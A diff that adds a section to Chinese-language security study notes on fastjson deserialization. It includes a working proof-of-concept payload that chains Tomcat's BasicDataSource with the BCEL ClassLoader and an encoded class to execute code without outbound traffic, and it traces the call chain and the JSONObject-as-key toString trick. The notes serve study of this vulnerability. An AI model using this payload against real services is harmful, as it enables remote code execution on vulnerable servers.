@@ -353,6 +353,93 @@ public byte[] bytesValue() {
 
 
 
+# BasicDataSource利用链（不出网）
+
+### POC
+
+```java
+        String poc = "{\n" +
+                "    {\n" +
+                "        \"x\":{\n" +
+                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
+                "                \"driverClassLoader\": {\n" +
+                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
+                "                },\n" +
+                "                \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$c2$40$U$3d$D$85$96ZD$40$7c$bf$9f$e0B6$ee4n$8c$s$c6$fa$88$Y$5d$P$e3$EGKK$ca$60$fc$p$d7n$d4$b8$f0$D$fc$u$e3$9d$8a$8fD$9b$f4$3e$ce$bd$e7$dc$7b$db$b7$f7$97W$A$hXq$e1$60$d4$c5$Y$c6$jL$Y$3fic$caE$G$d36fl$cc2d$b7T$a8$f46C$baZ$3bg$b0v$a2K$c9P$f0U$u$8fz$ed$a6$8c$cfx3$m$a4$e4G$82$H$e7$3cV$s$ef$83$96$beR$5d$d2$f0woU$b0$c9$e0l$89$a0$_$c7$a8$5c$f1$af$f9$z$af$ab$a8$be$7f$bc$7b$tdG$ab$u$a4$b6$7cCsqs$c8$3b$89$Mm$c4$e06$a2$5e$y$e4$9e2$b29$p$b7n$b8$krpm$ccy$98$c7$C$cd$a3$V$84$87E$y1$94$ff$d1$f6$b0$M$97$da$M$9fa$u$e9$Ix$d8$aa$l7$af$a5$d0$M$c5$l$e8$b4$Xj$d5$a6inK$ea$ef$a4R$ad$f9$7fzheK$deI$c1$b0Z$fdUm$e8X$85$ad$cd$df$84$938$S$b2$db$rB$a1CE$9d$iz$Ws$n$e9$A$9b$7e$86yR$60$e6$y$b2$D$94$d5$c93$f2$99$b5$t$b0$87$a4$ec$91$cd$7e$82$c8$93$f5$fa$f1$m$K$e4$j$M$7d$93y$o$G$94$9e$91$w$a5$la$5d$dc$c39X$7bD$f6$n$c1s$c4$cd$m$9d$u$8ePd$d89b$9a$ef$9a$t$95$oE_$T$f2$b0$u$_QV$a6$d7F$ca$b71lQ$a1$92$y5$f2$B$b8$ix$a4V$C$A$A\"\n" +
+                "        }\n" +
+                "    }: \"x\"\n" +
+                "}";
+        JSON.parse(poc);
+```
+
+```json
+{
+    {
+        "x":{
+                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
+                "driverClassLoader": {
+                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
+                },
+                "driverClassName": "$$BCEL$$$l$8b$I$A$..."
+        }
+    }: "x"
+}
+```
+
+利用了BCEL。
+
+调用链：
+
+```
+BasicDataSource.getConnection()
+createDataSource()
+createConnectionFactory()
+```
+
+有个小trick需要学习，就是如果JSONObject位于JSON的key上的时候：
+
+```java
+key = (key == null) ? "null" : key.toString();
+```
+
+会调用`toString()`，这个之前也知道是什么：
+
+```java
+    public String toString() {
+        return toJSONString();
+    }
+```
+
+`toJSONString()`会调用`getter`和`setter`，导致了`getConnection()`的调用。
+
+跟进：
+
+![image-20220313114246141]([Java安全]fastjson学习.assets/image-20220313114246141.png)
+
+![image-20220313114301489]([Java安全]fastjson学习.assets/image-20220313114301489.png)
+
+```java
+    protected ConnectionFactory createConnectionFactory() throws SQLException {
+        // Load the JDBC driver class
+        Driver driverToUse = this.driver;
+
+        if (driverToUse == null) {
+            Class<?> driverFromCCL = null;
+            if (driverClassName != null) {
+                try {
+                    try {
+                        if (driverClassLoader == null) {
+                            driverFromCCL = Class.forName(driverClassName);
+                        } else {
+                            driverFromCCL = Class.forName(
+                                    driverClassName, true, driverClassLoader);
+                        }
+```
+
+`Class.forName`第二个参数为true，可以触发static中的代码，这时候再加上`driverClassName`和`driverClassLoader`都可控，利用BCEL加载即可。
+
+需要学习的姿势就是那个`toString`，前面加东西让生成的是`JSONObject`
+
 # fastjson 1.2.25-1.2.41
 
 在1.2.24的基础上增加了`checkAutoType()`方法：
